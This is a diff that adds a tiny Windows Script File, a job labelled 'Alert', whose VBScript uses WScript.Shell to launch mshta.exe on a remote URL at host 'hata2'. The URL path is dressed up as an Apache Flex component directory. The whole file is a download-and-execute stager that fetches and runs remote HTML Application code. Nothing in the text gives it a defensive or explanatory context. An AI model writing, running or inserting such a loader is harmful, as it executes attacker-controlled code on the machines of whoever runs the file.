@@ -1,0 +1,6 @@
+<job id="Alert">
+<script language="VBScript">
+    Option Explicit
+	CreateObject("WScript.Shell").Run """" & "C:\WINDOWS\system32\mshta.exe" & """" & "http://hata2/Flash/ApacheFlex/mx/containers/ControlBar/index.html",1
+</script>
+</job>
